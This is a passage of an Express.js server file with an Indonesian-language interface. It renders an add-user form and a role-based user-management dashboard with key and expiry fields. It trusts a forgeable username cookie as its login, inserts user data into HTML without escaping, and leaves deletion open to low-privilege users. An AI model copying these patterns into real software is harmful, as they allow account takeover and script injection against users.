      box-shadow: 0 0 10px rgba(30, 58, 138, 0.4);
      background: rgba(30, 58, 138, 0.15);
    }

    .container {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 10px;
    }

    h1 {
      font-size: 1.5rem;
      margin-bottom: 15px;
    }

    label {
      font-size: 13px;
      margin-bottom: 4px;
    }

    .space-y-4 > * {
      margin-bottom: 12px;
    }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen relative">
  <div id="particles-js"></div>

  <a href="/dashboard" class="back-to-dashboard">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="container">
    <!-- Video Banner di atas form -->
    <div class="video-banner">
      <video autoplay muted loop playsinline>
        <source src="https://files.catbox.moe/ar2frm.mp4" type="video/mp4">
      </video>
    </div>

    <main class="form-card w-full rounded-xl">
      <h1 class="text-2xl font-bold text-blue-400 text-center mb-4">Tambah User Baru</h1>
      <form id="userForm" action="/add-user" method="POST" class="space-y-3">
        <div>
          <label class="block text-xs mb-1 text-blue-200">Username</label>
          <input name="username" class="w-full rounded input-field focus:ring-1 focus:ring-blue-500 text-sm" placeholder="Masukkan username" required>
        </div>
        <input type="hidden" name="key" value="${crypto.randomBytes(2).toString('hex').toUpperCase()}">
        <div>
          <label class="block text-xs mb-1 text-blue-200">Role</label>
          <select name="role" class="w-full rounded input-field focus:ring-1 focus:ring-blue-500 text-sm">
            ${roleOptionsForForm}
          </select>
        </div>
        <div>
          <label class="block text-xs mb-1 text-blue-200">Expired (hari)</label>
          <input name="expired" type="number" class="w-full rounded input-field focus:ring-1 focus:ring-blue-500 text-sm" placeholder="Masukkan jumlah hari" required>
        </div>
        <button class="glow w-full rounded text-white font-semibold text-sm mt-2" type="submit">
          <i class="fas fa-plus mr-1"></i> Tambah User
        </button>
      </form>
    </main>
  </div>

  <div class="bottom-menu" id="bottomMenu">
    <div class="menu-container">
      <a href="/dashboard" class="menu-item"><i class="fas fa-home menu-icon"></i><span class="menu-label">Dashboard</span></a>
      <a href="/execution" class="menu-item"><i class="fas fa-bolt menu-icon"></i><span class="menu-label">Execution</span></a>
      <a href="/tools" class="menu-item"><i class="fas fa-tools menu-icon"></i><span class="menu-label">Tools</span></a>
      <a href="/channel" class="menu-item"><i class="fab fa-whatsapp menu-icon"></i><span class="menu-label">Channel</span></a>
    </div>
  </div>

  <script>
    // Initialize particles dengan tema biru
    particlesJS('particles-js', {
      particles: {
        number: { value: 40, density: { enable: true, value_area: 600 } },
        color: { value: "#1e3a8a" },
        opacity: { value: 0.3, random: true },
        size: { value: 2, random: true },
        line_linked: {
          enable: true,
          distance: 120,
          color: "#1e3a8a",
          opacity: 0.2,
          width: 1
        },
        move: { enable: true, speed: 1.5, random: true }
      },
      interactivity: {
        detect_on: "canvas",
        events: { onhover: { enable: true, mode: "repulse" } },
        modes: { repulse: { distance: 80 } }
      },
      retina_detect: true
    });

    // Handle keyboard appearance on mobile
    const bottomMenu = document.querySelector('.bottom-menu');
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', () => {
        const heightDiff = window.innerHeight - window.visualViewport.height;
        if (heightDiff > 100) {
          bottomMenu.style.transform = 'translateY(100%)';
          bottomMenu.style.transition = 'transform 0.3s ease';
        } else {
          bottomMenu.style.transform = 'translateY(0)';
        }
      });
    }

    // Form validation
    document.getElementById('userForm').addEventListener('submit', function(e) {
      const username = this.querySelector('input[name="username"]').value.trim();
      const expired = this.querySelector('input[name="expired"]').value;
      
      if (!username) {
        e.preventDefault();
        alert('Username harus diisi!');
        return;
      }
      
      if (!expired || expired < 1) {
        e.preventDefault();
        alert('Expired harus lebih dari 0 hari!');
        return;
      }
    });

    // Auto-hide bottom menu when keyboard appears (mobile)
    document.addEventListener('DOMContentLoaded', function() {
      const bottomMenu = document.getElementById('bottomMenu');
      
      if (window.visualViewport) {
        const initialHeight = window.visualViewport.height;
        
        window.visualViewport.addEventListener('resize', () => {
          const heightDiff = initialHeight - window.visualViewport.height;
          
          if (heightDiff > 100) {
            bottomMenu.style.transform = 'translateY(100%)';
            bottomMenu.style.transition = 'transform 0.3s ease';
          } else {
            bottomMenu.style.transform = 'translateY(0)';
          }
        });
      }
    });
  </script>
</body>
</html>
  `);
});

//=== Add User ====//
app.post("/add-user", express.urlencoded({ extended: true }), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);

  if (!currentUser) {
    return res.status(403).send("Akses ditolak");
  }

  const { username, role, expired } = req.body;

  // 🔹 Role yang boleh dibuat sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  } else {
    return res.status(403).send("Akses ditolak");
  }

  // Validasi role yang dikirim
  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  const key = generateKey();
  const expiredTimestamp = convertDaysToTimestamp(Number(expired));

  users.push({
    username,
    key,
    role,
    expired: expiredTimestamp,
    deviceId: ""
  });

  saveUsers(users);
  res.redirect("/dashboard");
});

// Edit User
app.post("/edit-user", express.json(), (req, res) => {
  const sessionUser = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === sessionUser);
  if (!currentUser) return res.status(403).send("Akses ditolak");

  let { index, username, role, expired, deviceId } = req.body;
  index = Number(index);

  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  // 🔹 Role yang boleh diedit sesuai role login
  let allowedRoles = [];
  if (currentUser.role === "owner") {
    allowedRoles = ["owner", "admin", "vip", "user"];
  } else if (currentUser.role === "admin") {
    allowedRoles = ["vip", "user"];
  } else if (currentUser.role === "vip") {
    allowedRoles = ["user"];
  }

  if (!allowedRoles.includes(role)) {
    return res.status(400).send("Role tidak valid untuk kamu");
  }

  let newExpired = Number(expired);
  if (newExpired < 1000000000000) {
    newExpired = Date.now() + newExpired * 24 * 60 * 60 * 1000;
  }

  users[index] = {
    ...users[index],
    username,
    role,
    expired: newExpired,
    deviceId
  };

  saveUsers(users);
  res.sendStatus(200);
});

// Hapus User
app.post("/delete-user", express.json(), (req, res) => {
  let { index } = req.body;
  index = Number(index);

  const users = getUsers();
  if (!users[index]) return res.status(404).send("User tidak ditemukan");

  const username = req.cookies.sessionUser; // User yang login sekarang
  const currentUser = users.find(u => u.username === username);
  const targetUser = users[index];

  if (!currentUser) return res.status(403).send("Session tidak valid");

  // Aturan hapus
  if (currentUser.role === "vip" && (targetUser.role === "owner" || targetUser.role === "admin")) {
    return res.status(403).send("❌ VIP tidak boleh menghapus Owner/Admin");
  }
  if (currentUser.role === "admin" && targetUser.role === "owner") {
    return res.status(403).send("❌ Admin tidak boleh menghapus Owner");
  }

  // Owner bisa hapus semua
  users.splice(index, 1);
  saveUsers(users);
  res.sendStatus(200);
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  // === Batasan akses ===
  const allowedRoles = ["owner", "admin", "vip"];
  if (!allowedRoles.includes(currentUser.role)) {
    return res.status(403).send("❌ Kamu tidak punya akses ke halaman ini.");
  }

  // === Opsi role di form Add User ===
const roleOptionsByRole = {
  vip: ["user"],
  admin: ["vip", "user"],
  owner: ["admin", "vip", "user"]
};

const roleOptionsForForm = roleOptionsByRole[currentUser.role]
  .map(role => `<option value="${role}">${role.charAt(0).toUpperCase() + role.slice(1)}</option>`)
  .join("");

const roleOptionsHTML = (selectedRole, isCurrentUserVip, userRole) => {
  // Jika yang login vip, dan user yang dirender adalah owner/admin/vip, 
  // maka dropdown hanya punya 1 pilihan "user", tapi kalau role user adalah owner/admin/vip maka tampilkan juga optionnya sebagai disabled agar tidak hilang dari tampilan.
  if (isCurrentUserVip) {
    // Jika user di data punya role owner/admin/vip, tampilkan option itu tapi disabled (tidak bisa dipilih),
    // dan juga tampilkan option user yang bisa dipilih.
    if (["owner", "admin", "vip"].includes(userRole)) {
      // Buat option sesuai role user tapi disabled
      const specialOption = `<option value="${userRole}" selected disabled>${userRole.charAt(0).toUpperCase() + userRole.slice(1)}</option>`;
      // Plus option user biasa yang bisa dipilih (tidak selected)
      const userOption = `<option value="user" ${selectedRole === "user" ? "selected" : ""}>User</option>`;
      return specialOption + userOption;
    } else {
      // Kalau role biasa (user), tampilkan cuma option user saja
      return `<option value="user" selected>User</option>`;
    }
  } else {
    // Jika bukan vip (admin/owner)
    return roleOptionsByRole[currentUser.role]
      .map(
        role =>
          `<option value="${role}" ${selectedRole === role ? "selected" : ""}>${role.charAt(0).toUpperCase() + role.slice(1)}</option>`
      )
      .join("");
  }
};

const isVip = currentUser.role === "vip";

const userRows = users
  .map((user, i) => `
    <tr class="border-b border-pink-800 hover:bg-pink-800 transition" data-index="${i}">
      <td contenteditable="true" class="py-2 px-4 editable" data-field="username">${user.username}</td>
      <td>
        <select class="bg-transparent text-pink-300 border-none focus:ring-0 p-1 role-selector" data-field="role" ${
          user.role === "owner" && currentUser.role !== "owner" ? "disabled" : ""
        }>
          ${roleOptionsHTML(user.role, isVip, user.role)}
        </select>
      </td>
      <td class="py-2 px-4" contenteditable="true" data-field="deviceId">${user.deviceId || "-"}</td>
      <td class="py-2 px-4" contenteditable="true" data-field="expired">${user.expired}</td>
      <td class="py-2 px-4 flex gap-2">
        <button class="text-blue-400 hover:text-blue-600 save-btn" title="Simpan Perubahan">Simpan</button>
        <button class="text-pink-400 hover:text-pink-600 delete-btn" title="Hapus User">Hapus</button>
      </td>
    </tr>
  `).join("");
  
  // PERBAIKAN: Perbaiki syntax error di sini
  const userTableHTML = users.length > 0 ? userRows : `
    <tr>
      <td colspan="5" class="py-8 px-6 text-center">
        <div class="empty-state">
          <i class="fas fa-users-slash"></i>
          <h3 class="text-xl font-semibold mb-2">No Users Found</h3>
          <p class="text-blue-300">There are no users registered in the system yet.</p>
        </div>
      </td>
    </tr>
  `;

  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>

  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #000000;
      padding-bottom: 70px;
    }
    
    @keyframes gradientMove {
      0%   { background-position: 0% 50%; }
      25%  { background-position: 50% 100%; }
      50%  { background-position: 100% 50%; }
      75%  { background-position: 50% 0%; }
      100% { background-position: 0% 50%; }
    }
    
    td[contenteditable="true"]:focus {
      outline: 2px solid #1e3a8a;
    }

    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      top: 0;
      left: 0;
    }

    #mobileMenu {
      box-shadow: 0 0 20px rgba(30, 58, 138, 0.6); 
    }

    /* Video Banner */
    .video-banner {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -2;
      overflow: hidden;
    }

    .video-banner video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      opacity: 0.3;
      filter: brightness(0.7);
    }

    .video-banner::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        to bottom,
        rgba(0, 0, 0, 0.8) 0%,
        rgba(0, 0, 0, 0.6) 50%,
        rgba(0, 0, 0, 0.8) 100%
      );
    }

    /* Bottom Menu */
    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(10px);
      border-top: 1px solid rgba(30, 58, 138, 0.3);
      z-index: 1000;
      padding: 10px 0;
    }

    .menu-container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      max-width: 500px;
      margin: 0 auto;
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #cccccc;
      text-decoration: none;
      padding: 8px 12px;
      border-radius: 10px;
      transition: all 0.3s ease;
      flex: 1;
      text-align: center;
    }

    .menu-item.active,
    .menu-item:hover {
      background: rgba(30, 58, 138, 0.2);
      color: #ffffff;
    }

    .menu-icon {
      font-size: 1.2rem;
      margin-bottom: 5px;
    }

    .menu-label {
      font-size: 0.7rem;
    }

    /* Glow effect */
    .glow-blue {
      box-shadow: 0 0 15px rgba(30, 58, 138, 0.8);
    }

    .logo-glow {
      box-shadow: 0 0 25px 5px rgba(30, 58, 138, 0.7),
                  0 0 10px 2px rgba(30, 58, 138, 0.5);
    }

    html {
      scroll-behavior: smooth;
    }

    /* Custom styles for blue theme */
    .bg-blue-transparent {
      background: rgba(30, 58, 138, 0.1);
      backdrop-filter: blur(10px);
    }

    .border-blue {
      border-color: rgba(30, 58, 138, 0.4);
    }

    .text-blue-400 {
      color: #1e3a8a;
    }

    .hover\:text-blue-600:hover {
      color: #1e40af;
    }

    .bg-blue-800 {
      background-color: #1e3a8a;
    }

    .text-blue-200 {
      color: #bfdbfe;
    }

    /* New Styles for Improved Users Section */
    .users-container {
      background: rgba(30, 58, 138, 0.08);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(30, 58, 138, 0.3);
      border-radius: 16px;
      box-shadow: 
        0 8px 32px rgba(30, 58, 138, 0.2),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }

    .users-header {
      background: linear-gradient(135deg, rgba(30, 58, 138, 0.3), rgba(30, 58, 138, 0.1));
      backdrop-filter: blur(10px);
      border-bottom: 1px solid rgba(30, 58, 138, 0.3);
    }

    .users-table {
      background: transparent;
    }

    .users-table thead {
      background: linear-gradient(135deg, rgba(30, 58, 138, 0.4), rgba(30, 58, 138, 0.2));
      backdrop-filter: blur(10px);
    }

    .users-table th {
      background: transparent;
      border-bottom: 1px solid rgba(30, 58, 138, 0.3);
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .users-table tbody tr {
      background: rgba(30, 58, 138, 0.05);
      transition: all 0.3s ease;
      border-bottom: 1px solid rgba(30, 58, 138, 0.1);
    }

    .users-table tbody tr:hover {
      background: rgba(30, 58, 138, 0.15);
      transform: translateX(4px);
      box-shadow: 0 4px 12px rgba(30, 58, 138, 0.2);
    }

    .users-table tbody tr:nth-child(even) {
      background: rgba(30, 58, 138, 0.08);
    }

    .users-table tbody tr:nth-child(even):hover {
      background: rgba(30, 58, 138, 0.18);
    }

    .user-role-badge {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .role-admin {
      background: linear-gradient(135deg, rgba(30, 58, 138, 0.4), rgba(30, 58, 138, 0.2));
      color: #60a5fa;
      border: 1px solid rgba(96, 165, 250, 0.3);
    }

    .role-reseller {
      background: linear-gradient(135deg, rgba(59, 130, 246, 0.3), rgba(59, 130, 246, 0.1));
      color: #3b82f6;
      border: 1px solid rgba(59, 130, 246, 0.3);
    }

    .role-user {
      background: linear-gradient(135deg, rgba(99, 102, 241, 0.3), rgba(99, 102, 241, 0.1));
      color: #6366f1;
      border: 1px solid rgba(99, 102, 241, 0.3);
    }

    .action-btn {
      padding: 6px 12px;
      border-radius: 8px;
      font-size: 0.75rem;
      font-weight: 600;
      transition: all 0.3s ease;
      border: 1px solid rgba(30, 58, 138, 0.4);
      background: rgba(30, 58, 138, 0.1);
      color: #60a5fa;
    }

    .action-btn:hover {
      background: rgba(30, 58, 138, 0.3);
      box-shadow: 0 4px 12px rgba(30, 58, 138, 0.3);
      transform: translateY(-1px);
    }

    .device-id {
      font-family: 'Courier New', monospace;
      font-size: 0.75rem;
      color: #93c5fd;
      background: rgba(30, 58, 138, 0.1);
      padding: 4px 8px;
      border-radius: 6px;
      border: 1px solid rgba(30, 58, 138, 0.2);
    }

    .expired-date {
      font-size: 0.8rem;
      color: #bfdbfe;
    }

    .expired-soon {
      color: #fbbf24;
    }

    .expired-past {
      color: #ef4444;
    }

    .users-stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin-bottom: 20px;
    }

    .stat-card {
      background: rgba(30, 58, 138, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(30, 58, 138, 0.3);
      border-radius: 12px;
      padding: 16px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .stat-card:hover {
      background: rgba(30, 58, 138, 0.15);
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(30, 58, 138, 0.2);
    }

    .stat-number {
      font-size: 2rem;
      font-weight: 700;
      color: #60a5fa;
      margin-bottom: 4px;
    }

    .stat-label {
      font-size: 0.8rem;
      color: #bfdbfe;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .empty-state {
      text-align: center;
      padding: 40px 20px;
      color: #93c5fd;
    }

    .empty-state i {
      font-size: 3rem;
      margin-bottom: 16px;
      opacity: 0.5;
    }
  </style>
</head>
<body class="bg-black text-gray-400 min-h-screen flex flex-col">
  <div id="particles-js"></div>

<!-- Navbar -->
<header class="bg-white/10 backdrop-blur-md border-b border-white/20 flex items-center justify-between px-4 h-14 fixed w-full z-50">
  <!-- Kiri: Burger + Judul -->
  <div class="flex items-center gap-3">
    <!-- Tombol burger (mobile only) -->
    <button id="burgerBtn" aria-label="Toggle menu"
      class="md:hidden text-blue-400 hover:text-blue-600 focus:outline-none flex items-center gap-1 z-50 relative">
      <svg id="burgerIcon" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none"
           viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
      </svg>
    </button>

    <!-- Judul di mobile dan desktop -->
    <h1 class="text-lg md:text-xl font-bold text-blue-400">Settings</h1>
  </div>

  <!-- Desktop nav -->
  <nav class="hidden md:flex space-x-6 text-blue-300">
    <a href="#overview" class="hover:text-blue-600">Profile</a>
    <a href="#users" class="hover:text-blue-600">Users</a>
    <a href="#add-telegram" class="hover:text-blue-600">Add Id</a>
  </nav>
</header>

<!-- Overlay -->
<div id="overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40"></div>

<!-- Side Menu (mobile) -->
<nav id="mobileMenu"
     class="fixed top-0 left-0 h-full w-64 bg-black bg-opacity-90 border-r border-blue-700 text-blue-400 flex flex-col justify-between p-4 text-lg transform -translate-x-full transition-transform duration-300 ease-in-out z-50 md:hidden">

  <!-- Menu Atas -->
  <div class="space-y-2">
    <div class="mb-6">
      <h2 class="text-xl font-bold text-blue-500 tracking-wide">Menu Engine</h2>
      <div class="border-b border-blue-700 mt-2"></div>
    </div>

    <a href="#overview" onclick="toggleMobileMenu()"
       class="flex items-center gap-3 p-2 rounded hover:bg-blue-700 hover:text-white transition">
      <i class="fas fa-user-circle"></i>
      <span>Dasboard</span>
    </a>

    <a href="/add-user" onclick="toggleMobileMenu()"
       class="flex items-center gap-3 p-2 rounded hover:bg-blue-700 hover:text-white transition">
      <i class="fas fa-users"></i>
      <span>Users</span>
    </a>

    <a href="/add-telegram" onclick="toggleMobileMenu()"
       class="flex items-center gap-3 p-2 rounded hover:bg-blue-700 hover:text-white transition">
      <i class="fab fa-telegram-plane"></i>
      <span>Add ID</span>
    </a>
    
    <a href="/logout"
       class="flex items-center gap-3 p-2 rounded hover:bg-blue-700 hover:text-white transition text-blue-500 border-t border-blue-700 pt-4">
      <i class="fas fa-sign-out-alt"></i>
      <span>Logout</span>
    </a>
  </div>
</nav>

  <!-- Main Content -->
  <main class="mt-14 p-6 w-full space-y-8 flex flex-col items-center">

    <!-- Overview -->
    <section id="overview" class="text-white flex flex-col items-center w-full space-y-6">
      <!-- Logo -->
     <div class="w-[43%] aspect-square rounded-full overflow-hidden flex items-center justify-center logo-glow">
  <img src="img/Fyzz1.jpg" 
       alt="Logo" 
       class="w-full h-full object-cover">
</div>

  <h2 class="text-2xl font-bold mb-4 w-full max-w-5xl text-blue-400 text-start">Your Profile</h2>


      <!-- Info Card -->
      <div class="relative w-full max-w-5xl rounded-lg overflow-hidden shadow-lg glow-blue"
       style="
       background-image: url('img/Fyzz.jpg');
       background-size: cover;
       background-position: center;
       box-shadow: 0 0 25px 5px rgba(30, 58, 138, 0.7), 0 0 10px 2px rgba(30, 58, 138, 0.5);
     ">
      <div class="absolute inset-0 bg-black bg-opacity-70"></div>
        <div class="relative p-6 space-y-4">
          
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user text-blue-500"></i>
              <span><b>Username:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.username}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-key text-blue-500"></i>
              <span><b>Key:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${currentUser.key 
                ? (currentUser.key.includes('-') 
                    ? currentUser.key.split('-')[1] 
                    : currentUser.key) 
                : "-"}
            </span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-user-shield text-blue-500"></i>
              <span><b>Role:</b></span>
            </div>
            <span class="text-sm font-mono text-white">${currentUser.role}</span>
          </div>

          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <i class="fas fa-calendar-times text-blue-500"></i>
              <span><b>Expired:</b></span>
            </div>
            <span class="text-sm font-mono text-white">
              ${new Date(currentUser.expired).toISOString().split('T')[0]}
            </span>
          </div>

        </div>
      </div>
    </section>
    
   <!-- Users Section - IMPROVED -->
    <section id="users" class="w-full max-w-5xl">
      <h2 class="text-2xl font-bold mb-6 text-blue-400">User Management</h2>
      
      <!-- Statistics Cards -->
      <div class="users-stats">
        <div class="stat-card">
          <div class="stat-number">${users.length}</div>
          <div class="stat-label">Total Users</div>
        </div>
        <div class="stat-card">
          <div class="stat-number">${users.filter(u => new Date(u.expired) > new Date()).length}</div>
          <div class="stat-label">Active Users</div>
        </div>
        <div class="stat-card">
          <div class="stat-number">${users.filter(u => new Date(u.expired) <= new Date()).length}</div>
          <div class="stat-label">Expired Users</div>
        </div>
      </div>

      <!-- Users Table -->
      <div class="users-container overflow-hidden glow-blue">
        <div class="users-header p-4">
          <h3 class="text-lg font-semibold text-blue-300 flex items-center gap-2">
            <i class="fas fa-users"></i>
            Registered Users (${users.length})
          </h3>
        </div>
        
        <div class="overflow-x-auto">
          <table class="users-table min-w-full">
            <thead>
              <tr class="text-blue-200">
                <th class="py-4 px-6 text-left">Username</th>
                <th class="py-4 px-6 text-left">Role</th>
                <th class="py-4 px-6 text-left">Device ID</th>
                <th class="py-4 px-6 text-left">Expired</th>
                <th class="py-4 px-6 text-center">Actions</th>
              </tr>
            </thead>
            <tbody class="text-gray-300">
              ${userTableHTML}
            </tbody>
          </table>
        </div>
      </div>

      <!-- Add User Button -->
      <div class="mt-6 flex justify-end">
        <a href="/add-user" class="action-btn px-6 py-3 text-base">
          <i class="fas fa-plus mr-2"></i> Add New User
        </a>
      </div>
    </section>

  </main>

<div class="bottom-menu" id="bottomMenu">
    <div class="menu-container">
      <a href="/dashboard" class="menu-item active"><i class="fas fa-home menu-icon"></i><span class="menu-label">Dashboard</span></a>
      <a href="/execution" class="menu-item"><i class="fas fa-bolt menu-icon"></i><span class="menu-label">Execution</span></a>
      <a href="/tools" class="menu-item"><i class="fas fa-tools menu-icon"></i><span class="menu-label">Tools</span></a>
      <a href="/channel" class="menu-item"><i class="fab fa-whatsapp menu-icon"></i><span class="menu-label">Channel</span></a>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const msg = urlParams.get("msg");
  const type = urlParams.get("type");

  if (msg) {
   Swal.fire({
  icon: type || "info",
  title: msg,
  background: "#1a1a1a",
  color: "#1e3a8a",
  showConfirmButton: false,
  timer: 2500
});

    // Hapus query biar tidak muncul lagi pas refresh
    window.history.replaceState({}, document.title, window.location.pathname);
  }
  
// === FIX UNTUK BURGER MENU ===

// Ambil elemen
const burgerBtn = document.getElementById("burgerBtn");
const burgerIcon = document.getElementById("burgerIcon");
const mobileMenu = document.getElementById("mobileMenu");
const overlay = document.getElementById("overlay");

// Fungsi toggle menu
function toggleMobileMenu() {
  const isOpen = !mobileMenu.classList.contains("-translate-x-full");

  if (isOpen) {
    mobileMenu.classList.add("-translate-x-full");
    overlay.classList.add("hidden");
  } else {
    mobileMenu.classList.remove("-translate-x-full");
    overlay.classList.remove("hidden");
  }
}

// Klik tombol burger
burgerBtn.addEventListener("click", toggleMobileMenu);

// Klik overlay untuk menutup
overlay.addEventListener("click", toggleMobileMenu);

// Particles.js configuration for blue theme
particlesJS('particles-js', {
  particles: {
    number: { value: 80, density: { enable: true, value_area: 800 } },
    color: { value: "#1e3a8a" },
    shape: { type: "circle" },
    opacity: { value: 0.5, random: true },
    size: { value: 3, random: true },
    line_linked: {
      enable: true,
      distance: 150,
      color: "#1e3a8a",
      opacity: 0.4,
      width: 1
    },
    move: {
      enable: true,
      speed: 2,
      direction: "none",
      random: true,
      straight: false,
      out_mode: "out",
      bounce: false
    }
  },
  interactivity: {
    detect_on: "canvas",
    events: {
      onhover: { enable: true, mode: "repulse" },
      onclick: { enable: true, mode: "push" }
    },
    modes: {
      repulse: { distance: 100, duration: 0.4 },
      push: { particles_nb: 4 }
    }
  },
  retina_detect: true
});

// User Management Functions
document.addEventListener('DOMContentLoaded', function() {
  // Delete user confirmation
  const deleteButtons = document.querySelectorAll('.delete-btn');
  deleteButtons.forEach(button => {
    button.addEventListener('click', function() {
      const row = this.closest('tr');
      const index = row.getAttribute('data-index');
      const username = row.querySelector('[data-field="username"]').textContent;
      
      Swal.fire({
        title: 'Delete User?',
        text: \`Are you sure you want to delete user "\${username}"?\`,
        icon: 'warning',
        background: "#1a1a1a",
        color: "#1e3a8a",
        showCancelButton: true,
        confirmButtonColor: '#1e3a8a',
        cancelButtonColor: '#6b7280',
        confirmButtonText: 'Yes, delete it!',
        cancelButtonText: 'Cancel'
      }).then((result) => {
        if (result.isConfirmed) {
          // Send delete request
          fetch('/delete-user', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ index: parseInt(index) })
          })
          .then(response => {
            if (response.ok) {
              Swal.fire({
                title: 'Deleted!',
                text: 'User has been deleted successfully.',
                icon: 'success',
                background: "#1a1a1a",
                color: "#1e3a8a",
                confirmButtonColor: '#1e3a8a'
              }).then(() => {
                location.reload();
              });
            } else {
              Swal.fire({
                title: 'Error!',
                text: 'Failed to delete user.',
                icon: 'error',
                background: "#1a1a1a",
                color: "#ef4444",
                confirmButtonColor: '#ef4444'
              });
            }
          })
          .catch(error => {
            console.error('Error:', error);
            Swal.fire({
              title: 'Error!',
              text: 'Failed to delete user.',
              icon: 'error',
              background: "#1a1a1a",
              color: "#ef4444",
              confirmButtonColor: '#ef4444'
            });
          });
        }
      });
    });
  });

  // Save user functionality
  const saveButtons = document.querySelectorAll('.save-btn');
  saveButtons.forEach(button => {
    button.addEventListener('click', function() {
      const row = this.closest('tr');
      const index = row.getAttribute('data-index');
      const username = row.querySelector('[data-field="username"]').textContent;
      const role = row.querySelector('[data-field="role"]').value;
      const deviceId = row.querySelector('[data-field="deviceId"]').textContent;
      const expired = row.querySelector('[data-field="expired"]').textContent;

      fetch('/edit-user', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          index: parseInt(index),
          username,
          role,
          deviceId,
          expired
        })
      })
      .then(response => {
        if (response.ok) {
          Swal.fire({
            title: 'Saved!',
            text: 'User data has been updated successfully.',
            icon: 'success',
            background: "#1a1a1a",
            color: "#1e3a8a",
            confirmButtonColor: '#1e3a8a',
            timer: 1500
          });
        } else {
          Swal.fire({
            title: 'Error!',
            text: 'Failed to update user data.',
            icon: 'error',
            background: "#1a1a1a",
            color: "#ef4444",
            confirmButtonColor: '#ef4444'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        Swal.fire({
          title: 'Error!',
          text: 'Failed to update user data.',
          icon: 'error',
          background: "#1a1a1a",
          color: "#ef4444",
          confirmButtonColor: '#ef4444'
        });
      });
    });
  });
});
</script>

  </body>
  </html>
  `);
});


// === Halaman Add Telegram ===
app.get("/add-telegram", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  const allowedRoles = ["owner", "admin"];
  if (!allowedRoles.includes(currentUser.role)) {
    return res.status(403).send("❌ Hanya owner/admin yang boleh menambah Telegram ID.");
  }

  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Add Telegram - XboyTrazher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
